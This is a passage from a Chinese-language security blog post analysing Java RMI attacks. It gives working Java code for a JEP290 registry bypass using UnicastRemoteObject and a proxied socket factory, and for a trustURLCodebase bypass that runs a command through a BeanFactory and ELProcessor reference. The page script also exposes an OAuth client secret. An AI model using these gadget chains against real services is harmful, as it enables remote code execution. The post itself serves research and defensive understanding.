<span class="hljs-keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line"></span><br><span class="line">RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">        RMIServerSocketFactory.class.getClassLoader(),</span><br><span class="line">        <span class="hljs-keyword">new</span> Class[]&#123;RMIServerSocketFactory.class, Remote.class&#125;,</span><br><span class="line">        obj</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Constructor constructor = UnicastRemoteObject.class.getDeclaredConstructor(<span class="hljs-keyword">null</span>);</span><br><span class="line">constructor.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">UnicastRemoteObject unicastRemoteObject = (UnicastRemoteObject) constructor.newInstance(<span class="hljs-keyword">null</span>);</span><br><span class="line">Field field = UnicastRemoteObject.class.getDeclaredField(<span class="hljs-string">"ssf"</span>);</span><br><span class="line">field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">field.set(unicastRemoteObject, serverSocketFactory);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Registry reg = LocateRegistry.getRegistry("localhost", 1009);</span></span><br><span class="line"><span class="hljs-comment">// reg.bind("Exploit", unicastRemoteObject);</span></span><br><span class="line"></span><br><span class="line">ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">objectOutputStream.writeObject(unicastRemoteObject);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">byte</span>[] result = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(result);</span><br><span class="line">ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure>
+<p>调用栈很长，先从<code>java.rmi.server.UnicastRemoteObject#reexport</code>方法开始。当<code>csf</code>或<code>ssf</code>属性非空时，会用<code>csf</code>和<code>ssf</code>实例化一个<code>UnicastServerRef2</code>对象，并调用<code>UnicastServerRef2</code>父类<code>UnicastServerRef</code>的<code>exportObject</code>方法。</p>
+<p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-02-15 205305.png" alt></p>
+<p><code>UnicastServerRef</code>的<code>exportObject</code>方法就是实现监听端口的操作。后续精彩的部分来了，监听端口的操作会调用<code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>方法，其中会调用它的<code>ssf</code>属性的方法，这个<code>ssf</code>属性与前面<code>UnicastRemoteObject</code>对象的<code>ssf</code>属性一致，是封装<code>RemoteObjectInvocationHandler</code>的代理类对象。由于代理类的特性，会先调用<code>RemoteObjectInvocationHandler</code>类的<code>invoke</code>方法。再后面的调用栈与客户端调用远程方法的调用栈一致，也就是原本的注册中心变成了客户端，由于客户端没有启动JEP290设置，也就绕过了注册中心的JEP290限制。</p>
+<p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-02-15 211158.png" alt></p>
+<p>单在实际注册绑定的过程中，构造的类会在<code>RegistryImpl_Stub</code>的bind方法中，序列化类的输出流<code>ConnectionOutputStream</code>的父类<code>MarshalOutputStream</code>的<code>enableReplace</code>属性永为<code>true</code>，代理类被替换为<code>UnicastRef</code>造成利用链被破坏，所以实际利用中要想办法将<code>enableReplace</code>值改为<code>false</code>。<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">ysomap</a>中有实现方法，感兴趣可有看一看。</p>
+<p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-02-15 212912.png" alt></p>
+<h2 id="trustURLCodebase绕过"><a href="#trustURLCodebase绕过" class="headerlink" title="trustURLCodebase绕过"></a>trustURLCodebase绕过</h2><p>除了以上注册中心JEP290的限制之外，RMI中服务端对客户端的攻击：JNDI注入，使用rmi和ldap协议加载外部工厂类也先后受到<code>trustURLCodebase</code>的限制，只能从本地工厂类实例化对象。</p>
+<h3 id="本地工厂类绕过"><a href="#本地工厂类绕过" class="headerlink" title="本地工厂类绕过"></a>本地工厂类绕过</h3><p>使用本地工厂类进行JNDI注入和RMI协议远程加载恶意类的JNDI注入开头的调用栈基本相似，毕竟两者都是基于RMI协议的，但在<code>javax.naming.spi.NamingManager#getObjectInstance</code>这里开始就有所不同。在调用<code>getObjectFactoryFromReference</code>方法时返回的是本地正常的工厂类，这个工厂类是<code>ObjectFactory</code>的实现类或他的子类，然后调用工厂类的<code>getObjectInstance</code>方法。</p>
+<p>现在比较通用的<code>ObjectFactory</code>实现类是<code>BeanFactory</code>，他的<code>getObjectInstance</code>方法会从<code>ResourceRef</code>对象的<code>className</code>属性获取类名并实例化，然后从forceString的String引用地址以<code>=</code>号分割获取参数名和setter方法名，并反射获取这个setter参数为String的方法，最后获取参数名的String引用地址内内容，用实例化的对象调用这个setter方法。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">                                Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="hljs-function">    <span class="hljs-keyword">throws</span> NamingException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Reference ref = (Reference) obj;</span><br><span class="line">            String beanClassName = ref.getClassName();</span><br><span class="line">            Class&lt;?&gt; beanClass = <span class="hljs-keyword">null</span>;</span><br><span class="line">            ClassLoader tcl =</span><br><span class="line">                Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="hljs-keyword">if</span> (tcl != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">                    beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">                &#125; <span class="hljs-keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">                    beanClass = Class.forName(beanClassName);</span><br><span class="line">                &#125; <span class="hljs-keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="hljs-keyword">if</span> (beanClass == <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NamingException</span><br><span class="line">                    (<span class="hljs-string">"Class not found: "</span> + beanClassName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            Object bean = beanClass.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="hljs-comment">/* Look for properties with explicitly configured setter */</span></span><br><span class="line">            RefAddr ra = ref.get(<span class="hljs-string">"forceString"</span>);</span><br><span class="line">            Map&lt;String, Method&gt; forced = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            String value;</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span> (ra != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                value = (String)ra.getContent();</span><br><span class="line">                Class&lt;?&gt; paramTypes[] = <span class="hljs-keyword">new</span> Class[<span class="hljs-number">1</span>];</span><br><span class="line">                paramTypes[<span class="hljs-number">0</span>] = String.class;</span><br><span class="line">                String setterName;</span><br><span class="line">                <span class="hljs-keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">                <span class="hljs-comment">/* Items are given as comma separated list */</span></span><br><span class="line">                <span class="hljs-keyword">for</span> (String param: value.split(<span class="hljs-string">","</span>)) &#123;</span><br><span class="line">                    param = param.trim();</span><br><span class="line">                    <span class="hljs-comment">/* A single item can either be of the form name=method</span></span><br><span class="line"><span class="hljs-comment">                     * or just a property name (and we will use a standard</span></span><br><span class="line"><span class="hljs-comment">                     * setter) */</span></span><br><span class="line">                    index = param.indexOf(<span class="hljs-string">'='</span>);</span><br><span class="line">                    <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">0</span>) &#123;</span><br><span class="line">                        setterName = param.substring(index + <span class="hljs-number">1</span>).trim();</span><br><span class="line">                        param = param.substring(<span class="hljs-number">0</span>, index).trim();</span><br><span class="line">                    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                        ...</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">                        forced.put(param,</span><br><span class="line">                                   beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">                    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException|SecurityException ex) &#123;</span><br><span class="line">                        ...</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line"></span><br><span class="line">                ra = e.nextElement();</span><br><span class="line">                String propName = ra.getType();</span><br><span class="line"></span><br><span class="line">                <span class="hljs-keyword">if</span> (propName.equals(Constants.FACTORY) ||</span><br><span class="line">                    propName.equals(<span class="hljs-string">"scope"</span>) || propName.equals(<span class="hljs-string">"auth"</span>) ||</span><br><span class="line">                    propName.equals(<span class="hljs-string">"forceString"</span>) ||</span><br><span class="line">                    propName.equals(<span class="hljs-string">"singleton"</span>)) &#123;</span><br><span class="line">                    <span class="hljs-keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                value = (String)ra.getContent();</span><br><span class="line"></span><br><span class="line">                Object[] valueArray = <span class="hljs-keyword">new</span> Object[<span class="hljs-number">1</span>];</span><br><span class="line"></span><br><span class="line">                <span class="hljs-comment">/* Shortcut for properties with explicitly configured setter */</span></span><br><span class="line">                Method method = forced.get(propName);</span><br><span class="line">                <span class="hljs-keyword">if</span> (method != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                    valueArray[<span class="hljs-number">0</span>] = value;</span><br><span class="line">                    <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">                        method.invoke(bean, valueArray);</span><br><span class="line">                    &#125; <span class="hljs-keyword">catch</span> (...) &#123;</span><br><span class="line">                        ...</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="hljs-keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="hljs-keyword">return</span> bean;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (java.beans.IntrospectionException ie) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结合以上<code>getObjectInstance</code>代码逻辑，被反射的类需要符合以下条件才可被利用:</p>
+<ul>
+<li>具有一个无参公有构造方法</li>
+<li>具有一个公有、参数为String类型的方法</li>
+</ul>
+<p>一些使用了<code>tomcat-embed-el</code>依赖的项目，或者部分tomcat和spring的版本下具有的<code>javax.el.ELProcessor</code>类和他的<code>eval</code>方法符合这些条件，最终构造出用于绑定的Remote对象如下：</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ResourceRef resourceRef = <span class="hljs-keyword">new</span> ResourceRef(<span class="hljs-string">"javax.el.ELProcessor"</span>, (String) <span class="hljs-keyword">null</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-keyword">true</span>, <span class="hljs-string">"org.apache.naming.factory.BeanFactory"</span>, (String) <span class="hljs-keyword">null</span>);</span><br><span class="line">resourceRef.add(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">"forceString"</span>, <span class="hljs-string">"a=eval"</span>));</span><br><span class="line">resourceRef.add(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">"a"</span>, <span class="hljs-string">"Runtime.getRuntime().exec(\"calc\")"</span>));</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(resourceRef);</span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/AG0OfLfQWW-winIWiOtwLQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/AG0OfLfQWW-winIWiOtwLQ</a></p>
+<p><a href="https://su18.org/post/rmi-attack/" target="_blank" rel="noopener">https://su18.org/post/rmi-attack/</a></p>
+<p><a href="http://pipinstall.cn/2021/05/31/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener">http://pipinstall.cn/2021/05/31/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>
+<p><a href="https://xz.aliyun.com/t/7932" target="_blank" rel="noopener">https://xz.aliyun.com/t/7932</a></p>
+<p><a href="https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1" target="_blank" rel="noopener">https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1</a></p>
+<p><a href="https://www.anquanke.com/post/id/263726" target="_blank" rel="noopener">https://www.anquanke.com/post/id/263726</a></p>
+<p><a href="https://tttang.com/archive/1405/" target="_blank" rel="noopener">https://tttang.com/archive/1405/</a></p>
+<p><a href="https://mp.weixin.qq.com/s/gBuKDjRfnbJDv6TG5F6q3w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gBuKDjRfnbJDv6TG5F6q3w</a></p>
+
+        </div>
+        
+            <ul class="post-copyright">
+            <li><strong>本文标题：</strong><a href="https://blog.play2win.top/2022/02/16/Java_RMI攻击分析与总结/">Java RMI攻击分析与总结</a></li>
+            <li><strong>本文作者：</strong><a href="https://blog.play2win.top">P1ay2win</a></li>
+            <li><strong>本文链接：</strong><a href="https://blog.play2win.top/2022/02/16/Java_RMI攻击分析与总结/">https://blog.play2win.top/2022/02/16/Java_RMI攻击分析与总结/</a></li>
+            <li><strong>发布时间：</strong>2022-02-16</li>
+            <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+            </li>
+            </ul>
+        
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/RMI/">RMI</a>, <a class="has-link-grey -link" href="/tags/反序列化/">反序列化</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2022/03/22/JVM_Shellcode注入探索/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">JVM Shellcode注入探索</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2021/12/16/log4j漏洞分析/">
+                <span class="level-item">log4j漏洞分析</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<div id="comment-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '372fb49f2243341bf93b',
+        clientSecret: 'b79da9cd60cecc3af662428f1daa6e01b1702d75',
+        id: 'dd8f0c029c0310be8f4d51853914fedd',
+        repo: 'p1ay2win.github.io',
+        owner: 'p1ay2win',
+        admin: "p1ay2win",
+        createIssueManually: false,
+        distractionFreeMode: false
+    })
+    gitalk.render('comment-container')
+</script>
+
+
+    </div>
+</div>
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="/images/header.png" alt="p1ay2win">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        p1ay2win
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        他们的爱与风华，只问自由，只问盛放，只问深情，只问初心，只问勇敢，无问西东。
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>CN</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        35
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        7
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        31
+                    </p>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://p1ay2win.github.io" target="_blank">
+                关注我</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/P1ay2win/">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="https://twitter.com/p1ay2win">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+
+    
+        
+
+    <div class="card widget column-left is-sticky" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    目录
+                </h3>
+                <ul class="menu-list"><li>
+        <a class="is-flex" href="#RMI简介">
+        <span class="has-mr-6">1</span>
+        <span>RMI简介</span>
+        </a></li><li>
+        <a class="is-flex" href="#攻击方式">
+        <span class="has-mr-6">2</span>
+        <span>攻击方式</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#攻击注册中心">
+        <span class="has-mr-6">2.1</span>
+        <span>攻击注册中心</span>
+        </a></li><li>
+        <a class="is-flex" href="#攻击服务端">
+        <span class="has-mr-6">2.2</span>
+        <span>攻击服务端</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#反序列化参数">
+        <span class="has-mr-6">2.2.1</span>
+        <span>反序列化参数</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#攻击客户端">
+        <span class="has-mr-6">2.3</span>
+        <span>攻击客户端</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#反序列化注册绑定对象">
+        <span class="has-mr-6">2.3.1</span>
+        <span>反序列化注册绑定对象</span>
+        </a></li><li>
+        <a class="is-flex" href="#反序列化返回值">
+        <span class="has-mr-6">2.3.2</span>
+        <span>反序列化返回值</span>
+        </a></li></ul></li></ul></li><li>
+        <a class="is-flex" href="#JEP290及其绕过">
+        <span class="has-mr-6">3</span>
+        <span>JEP290及其绕过</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#UnicastRef-类绕过">
+        <span class="has-mr-6">3.1</span>
+        <span>UnicastRef 类绕过</span>
+        </a></li><li>
+        <a class="is-flex" href="#UnicastRemoteObject类绕过">
+        <span class="has-mr-6">3.2</span>
+        <span>UnicastRemoteObject类绕过</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#trustURLCodebase绕过">
+        <span class="has-mr-6">4</span>
+        <span>trustURLCodebase绕过</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#本地工厂类绕过">
+        <span class="has-mr-6">4.1</span>
+        <span>本地工厂类绕过</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#参考">
+        <span class="has-mr-6">5</span>
+        <span>参考</span>
+        </a></li></ul>
+            </div>
+        </div>
+    </div>
+
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+        </div>
+    
+</div>
+
+
+                
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    P1ay2win&#39;s blog
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2022 P1ay2win&nbsp;
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>访问量<span id="busuanzi_value_site_pv"></span>次  <i class="fa fa-user-md"></i>  访客数<span id="busuanzi_value_site_uv"></span>人<br>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://p1ay2win.github.io">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+<script>
+var IcarusThemeSettings = {
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+    
+    
+<script src="/js/animation.js"></script>
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+    
+    
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+    
+    
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
